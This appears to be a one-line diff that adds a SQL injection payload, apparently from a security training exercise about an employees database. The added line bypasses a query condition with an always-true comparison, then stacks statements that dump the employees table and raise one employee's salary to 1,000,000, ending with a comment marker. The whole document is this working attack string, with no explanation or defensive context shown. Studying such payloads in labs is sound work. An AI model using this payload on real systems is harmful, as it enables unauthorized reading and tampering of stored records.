@@ -1,0 +1,1 @@
+3SL99A' or '1' = '1'; SELECT * from employees;UPDATE employees SET salary = 1000000 WHERE last_name = 'Smith';--
